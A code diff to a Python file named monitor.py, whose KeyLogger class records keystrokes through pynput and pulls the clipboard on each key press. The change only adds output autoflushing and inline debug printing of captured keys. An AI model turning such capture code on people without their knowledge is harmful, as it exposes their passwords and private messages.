@@ -2,6 +2,8 @@
 #
 # monitor.py
 
+import io
+import sys
 import re
 import threading
 import time
@@ -11,6 +13,11 @@ from pynput.keyboard import Listener
 
 class KeyLogger:
     def __init__(self, debug=False):
+        # Autoflush output buffer
+        sys.stdout = io.TextIOWrapper(
+                open(sys.stdout.fileno(), 'wb', 0),
+                write_through=True
+            )
         global chat_is_active
         self.debug = debug
         chat_is_active = False
@@ -34,14 +41,12 @@ class KeyLogger:
     def on_press(self, key):
         self.pull_clipboard()
         register_ctrl = False
+
         if self.chat_is_active:
             return
 
         try:
             pressed = re.sub('\'', "", str(key))
-
-            if self.debug:
-                print(pressed)
 
             if re.search(r'^Key\..*', pressed):
                 if pressed in self.key_mapping:
@@ -53,6 +58,9 @@ class KeyLogger:
                     pass
                 else:
                     pressed = ""
+
+            if self.debug:
+                print(pressed, end="")
 
             self.lastlog += pressed 
 
